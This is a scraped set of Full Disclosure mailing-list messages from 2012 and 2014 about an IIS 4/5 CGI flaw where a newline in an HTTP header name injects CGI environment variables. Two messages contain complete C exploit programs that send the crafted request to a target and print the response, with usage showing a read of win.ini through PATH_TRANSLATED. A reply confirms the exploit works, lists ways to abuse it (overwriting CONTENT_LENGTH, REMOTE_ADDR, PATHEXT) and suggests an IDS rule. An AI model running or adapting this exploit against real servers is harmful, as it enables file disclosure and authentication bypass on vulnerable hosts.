=== Content from hi.baidu.com_494d2fd4_20250124_151521.html ===
   ![](data:image/png;base64...) 当前浏览器版本过低，推荐  [下载安装](https://www.google.cn/intl/zh-CN/chrome/?standalone=1)  兼容性更优的浏览器   ![](https://hi-commercial-static.bj.bcebos.com/hi-official/static/153232707/assets/images/loading.gif)

=== Content from seclists.org_e93f00b3_20250124_151523.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](107)
[By Date](date.html#108)
[![Next](/images/right-icon-16x16.png)](109)

[![Previous](/images/left-icon-16x16.png)](93)
[By Thread](index.html#108)
[![Next](/images/right-icon-16x16.png)](123)

![](/shared/images/nst-icons.svg#search)

# iis cgi 0day

---

*From*: yuange <yuange1975 () hotmail com>

*Date*: Wed, 9 Apr 2014 08:47:02 +0000

---

```

<http://hi.baidu.com/yuange1975/item/b2cc7141c22108e91e19bc2e>

 the exp file  ver4.1.1  .
<http://seclists.org/fulldisclosure/2012/Apr/13>

usage:
 iisexp411 127.0.0.1  /AprilFools'Day.php  PATH_TRANSLATED  c:\windows\win.ini

   /*  iisexp41.c  ver4.1 copy by @yuange1975 2012.4.1
  iisexp411.c  ver4.1.1 copy by @yuange1975 2012.4.2

  1.Changing the input parameters  2.To increase the receive data

  假作真时真亦假。True Mingled also false.
  <http://weibo.com/yuange1975>
  <http://twitter.com/yuange75>
  <http://hi.baidu.com/yuange1975/blog/item/ac368655017819dbb745aeee.html>
*/
#include <stdio.h>
#include <stdlib.h>#include <winsock2.h>
#include <windows.h>
#include <mswsock.h>
#include <wsnwlink.h>
#include <ws2tcpip.h>
#include <process.h>    /* _beginthread, _endthread */
#include <errno.h>
#include <io.h>
#include <conio.h>#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Mswsock")/*
char  *AprilFoolsDay ="GET /AprilFools'Day.php  HTTP/1.1\r\nHOST:weibo.com/yuange1975\r\na=b\nc:shellcode\r\n\r\n";
*/
char  *AprilFoolsDay ="GET %s HTTP/1.1\r\nHOST:%s\r\na=b\n%s:%s\r\n\r\n"; static unsigned int maybe_lookup_host(char*
name)
{
  unsigned long ulAddr = INADDR_NONE;  /* Don't bother resolving raw IP addresses, naturally. */
  ulAddr = inet_addr((char*)name);
  if ( ulAddr != INADDR_NONE && ulAddr != INADDR_ANY )
   return (unsigned int)ulAddr;  return 0;
}int do_exp(char *hostname,unsigned int port,char *AprilFools, char *c,char *shellcode)
{
    SOCKET hScoket = INVALID_SOCKET;
 struct sockaddr_in sin;
 unsigned int addr=0;
 int write_res = 0;
 int read_res = 0;
 char crash_buf[0x4000];
 int crash_buflen=0;
 /*
     create SOCKET
  */
 hScoket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0/*WSA_FLAG_OVERLAPPED*/);
 if (hScoket == INVALID_SOCKET) {
  printf_s("WSASocket function failed with error = %d\n", WSAGetLastError() );
  return -1;
 }   /* Resolved IP address          */
 addr = maybe_lookup_host(hostname); sin.sin_family = AF_INET;
 sin.sin_port   = htons(port);
 memcpy(&sin.sin_addr,&addr,4); /*
     connect
  */
 if ( connect(hScoket, (struct sockaddr*) &sin, sizeof(struct sockaddr_in) ) == SOCKET_ERROR) {
  if ( WSAEWOULDBLOCK != WSAGetLastError() ) {
   closesocket(hScoket);
   printf_s("connect function failed with error: %ld\n", WSAGetLastError());
   return -1;
  }
 }

 printf("[*] connected to %s:%d\n",hostname,port);

 //build_crash_package(&crash_buf,&crash_buflen);
sprintf_s(crash_buf,0x400,AprilFoolsDay,AprilFools,hostname,c,shellcode);
 crash_buflen = strlen(crash_buf); //printf("%s",crash_buf);
  /*
      send data to remote target
   */
  write_res = send( hScoket,
                 crash_buf,
                       crash_buflen,
                       0);

  printf("[*] send %d bytes\n\n",write_res);
    while(1){
  read_res     =    recv( hScoket,
                 crash_buf,
                       0x4000-1,
                       0);
  if(read_res<=0) break;
  crash_buf[read_res]=0;
  printf("%s",crash_buf);
    } closesocket(hScoket);
 return 0;
}int main(int argc, const char **argv)
{
    int iResult;
    char * target_ip = (char*)argv[1];
 char *AprilFools="/AprilFools'Day.php";
 char *c="c";
 char *shellcode="shellcode";
 WSADATA wsaData; if ( !target_ip || argc < 2 ) {
  printf_s("usage: <target_ip> /AprilFools'Day.php c shellcode \n");
  return 0;
 }
 if(argc>2)  AprilFools=(char*)argv[2];
 if(argc>3)  c= (char*)argv[3];
 if(argc>4)  shellcode=(char*)argv[4];

 /* Initialize Winsock */
 iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 if (iResult != 0) {
  printf_s("WSAStartup failed: %d\n", iResult);
  return -1;
 } do_exp(target_ip,80,AprilFools,c,shellcode);

 /* clean - win socket */
 WSACleanup(); return 0;
}

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](107)
[By Date](date.html#108)
[![Next](/images/right-icon-16x16.png)](109)

[![Previous](/images/left-icon-16x16.png)](93)
[By Thread](index.html#108)
[![Next](/images/right-icon-16x16.png)](123)

### Current thread:

* **iis cgi 0day** *yuange (Apr 09)*
  + *Message not available*
    - [Re: iis cgi 0day](123) *yuange (Apr 09)*

* <Possible follow-ups>
* [Re: iis cgi 0day](128) *YiFei Yang (Apr 10)*
  + *Message not available*
    - [Re: iis cgi 0day](155) *YiFei Yang (Apr 10)*
* [Re: iis cgi 0day](217) *Davide Davini (Apr 16)*
  + [Re: iis cgi 0day](219) *Reindl Harald (Apr 16)*+ [Re: iis cgi 0day](245) *Homer Parker (Apr 18)*+ [Re: iis cgi 0day](247) *YiFei Yang (Apr 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_41a5475f_20250124_151524.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](246)
[By Date](date.html#247)
[![Next](/images/right-icon-16x16.png)](248)

[![Previous](/images/left-icon-16x16.png)](245)
[By Thread](index.html#247)
[![Next](/images/right-icon-16x16.png)](129)

![](/shared/images/nst-icons.svg#search)

# Re: iis cgi 0day

---

*From*: YiFei Yang <le.concorde.4590 () gmail com>

*Date*: Sat, 19 Apr 2014 11:22:49 +0800

---

```
Confirmed working, however it can only overwrite environment variables
whose name is all capital, you can't overwrite Path.

So, you can overwrite CONTENT_LENGTH, which may trigger buffer overflow in
some applications that depends on this variable to allocate buffer, or have
the application allocating a huge amount of memory.
And HTTPS/REMOTE_ADDR/REMOTE_HOST, which might trick some apps to lower
their security level like allowing plaintext authentication since you're
using HTTPS, or even bypassing auth altogether since it thinks the remote
host is trusted.
Or overwrite PATHEXT to put .CMD/.BAT/.VBS etc. before .EXE
Or, PATH_TRANSLATED, so that you can have the CGI program read anything you
want as its input, as long as the account running it have sufficient
privilege.

Anyway, there's a lot of possible ways of exploiting this.

'\n' must be present in the header name for this to work, like this:
junk=whatever\nEnvironment-Variable: Something

Which becomes 2 seperate environment variables like this:
HTTP_JUNK=WHATEVER
ENVIRONMENT_VARIABLE=Something

And this:
junk\nEnvironment-Variable: Something

Gets turned into this:
ENVIRONMENT_VARIABLE=Something

If, for whatever reason, you really have to stick to Windows 2000+IIS 5,
have an IDS/IPS and configure a rule to detect '\n' in the HTTP header name
may help.

Otherwise, time to upgrade.

2014-04-19 4:15 GMT+08:00 Homer Parker <hparker () homershut net>:

```
> ```
> On Wed, 2014-04-16 at 12:25 +0200, Reindl Harald wrote:
>
> ```
> > ```
> > Am 16.04.2014 08:39, schrieb Davide Davini:
> >
> > ```
> > > ```
> > > YiFei Yang wrote:
> > >
> > > ```
> > > > ```
> > > > It is a bug affecting IIS4/5 using CGI on Windows NT/2000. Microsoft
> > > >
> > > > ```
>
> ```
> is
>
> ```
> > > > ```
> > > > aware of it and won't fix it.
> > > >
> > > > ```
> > >
> > > ```
> > >
> > >
> > > Is there any workaround this bug? I might be slow but I can't find any
> > >
> > > ```
> >
> > ```
> >
> >
> > just don't use unsupported OS versions if you care about
> > security - i know people even forgot NT/2000 existed
> >
> > ```
>
> ```
>
>
>         Oh?
>
> <
> <http://news.netcraft.com/archives/2014/04/08/thousands-of-websites-still-hosted-on-windows-xp.html>
>
> ```
> > ```
> >
> >
> >
> > ```
>
> ```
>
>
> --
> Homer Parker <hparker () homershut net>
>
>
> _______________________________________________
> Sent through the Full Disclosure mailing list
> <http://nmap.org/mailman/listinfo/fulldisclosure>
> Web Archives & RSS: <http://seclists.org/fulldisclosure/>
>
>
> ```

```

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](246)
[By Date](date.html#247)
[![Next](/images/right-icon-16x16.png)](248)

[![Previous](/images/left-icon-16x16.png)](245)
[By Thread](index.html#247)
[![Next](/images/right-icon-16x16.png)](129)

### Current thread:

* [iis cgi 0day](108) *yuange (Apr 09)*
  + *Message not available*
    - [Re: iis cgi 0day](123) *yuange (Apr 09)*

* <Possible follow-ups>
* [Re: iis cgi 0day](128) *YiFei Yang (Apr 10)*
  + *Message not available*
    - [Re: iis cgi 0day](155) *YiFei Yang (Apr 10)*
* [Re: iis cgi 0day](217) *Davide Davini (Apr 16)*
  + [Re: iis cgi 0day](219) *Reindl Harald (Apr 16)*+ [Re: iis cgi 0day](245) *Homer Parker (Apr 18)*+ **Re: iis cgi 0day** *YiFei Yang (Apr 18)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_653b9a6d_20250124_151522.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

![Previous](/images/left-icon-16x16.png)
[By Date](date.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![Previous](/images/left-icon-16x16.png)
[By Thread](index.html#0)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# FW: iis bug

---

*From*: yuange <yuange1975 () hotmail com>

*Date*: Sun, 1 Apr 2012 07:51:09 +0000

---

```

 the exp file.  /*  iisexp41.c  ver4.1 copy by @yuange1975 2012.4.1
  假作真时真亦假。  <http://weibo.com/yuange1975>
  <http://twitter.com/yuange75>
  <http://hi.baidu.com/yuange1975/blog/item/ac368655017819dbb745aeee.html>
*/
#include <stdio.h>
#include <stdlib.h>#include <winsock2.h>
#include <windows.h>
#include <mswsock.h>
#include <wsnwlink.h>
#include <ws2tcpip.h>
#include <process.h>    /* _beginthread, _endthread */
#include <errno.h>
#include <io.h>
#include <conio.h>#pragma comment(lib,"ws2_32")
#pragma comment(lib,"Mswsock")char  *AprilFoolsDay ="GET /AprilFools'Day.php
HTTP/1.1\r\nHOST:weibo.com/yuange1975\r\na=b\nc:shellcode\r\n\r\n"; static unsigned int maybe_lookup_host(char* name)
{
  unsigned long ulAddr = INADDR_NONE;  /* Don't bother resolving raw IP addresses, naturally. */
  ulAddr = inet_addr((char*)name);
  if ( ulAddr != INADDR_NONE && ulAddr != INADDR_ANY )
   return (unsigned int)ulAddr;  return 0;
}int do_exp(char *hostname,unsigned int port)
{
    SOCKET hScoket = INVALID_SOCKET;
 struct sockaddr_in sin;
 unsigned int addr=0;
 int write_res = 0;
 char * crash_buf=NULL;
 int crash_buflen=0; /*
     create SOCKET
  */
 hScoket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0/*WSA_FLAG_OVERLAPPED*/);
 if (hScoket == INVALID_SOCKET) {
  printf_s("WSASocket function failed with error = %d\n", WSAGetLastError() );
  return -1;
 }   /* Resolved IP address          */
 addr = maybe_lookup_host(hostname); sin.sin_family = AF_INET;
 sin.sin_port   = htons(port);
 memcpy(&sin.sin_addr,&addr,4); /*
     connect
  */
 if ( connect(hScoket, (struct sockaddr*) &sin, sizeof(struct sockaddr_in) ) == SOCKET_ERROR) {
  if ( WSAEWOULDBLOCK != WSAGetLastError() ) {
   closesocket(hScoket);
   printf_s("connect function failed with error: %ld\n", WSAGetLastError());
   return -1;
  }
 }

 printf("[*] connected to %s:%d\n",hostname,port);

 //build_crash_package(&crash_buf,&crash_buflen); crash_buf = AprilFoolsDay;
 crash_buflen = strlen(AprilFoolsDay);
  /*
      send data to remote target
   */
  write_res = send( hScoket,
                 crash_buf,
                       crash_buflen,
                       0);

  printf("[*] send %d bytes\n",write_res);
  closesocket(hScoket);
 return 0;
}int main(int argc, const char **argv)
{
    int iResult;
 int count=0;
    char * target_ip = (char*)argv[1];
 WSADATA wsaData; if ( !target_ip || argc < 2 ) {
  printf_s("usage: <target_ip>\n");
  return 0;
 }

 /* Initialize Winsock */
 iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 if (iResult != 0) {
  printf_s("WSAStartup failed: %d\n", iResult);
  return -1;
 } do_exp(target_ip,80);

 /* clean - win socket */
 WSACleanup(); return 0;
}
  From: yuange1975 () hotmail com
To: full-disclosure () lists grok org uk
Subject: iis bug
Date: Sun, 1 Apr 2012 03:30:29 +0000

iis new bug:

<http://weibo.com/yuange1975>

poc:

char  *AprilFoolsDay ="GET /AprilFools'Day.php
HTTP/1.1\r\nHOST:[http://weibo.com/yuange1975\r\na=b\nc:shellcode\r\n\r\n"](http://weibo.com/yuange1975%5Cr%5Cna%3Db%5Cnc%3Ashellcode%5Cr%5Cn%5Cr%5Cn%22);;

```

**Attachment:
[iisexp41.c](att-0/iisexp41_c.bin)**

*Description:*

```
_______________________________________________
Full-Disclosure - We believe in it.
Charter: <http://lists.grok.org.uk/full-disclosure-charter.html>
Hosted and sponsored by Secunia - <http://secunia.com/>
```

---

![Previous](/images/left-icon-16x16.png)
[By Date](date.html#0)
[![Next](/images/right-icon-16x16.png)](1)

![Previous](/images/left-icon-16x16.png)
[By Thread](index.html#0)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **FW: iis bug** *yuange (Apr 01)*
  + [Re: iis bug](13) *yuange (Apr 01)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


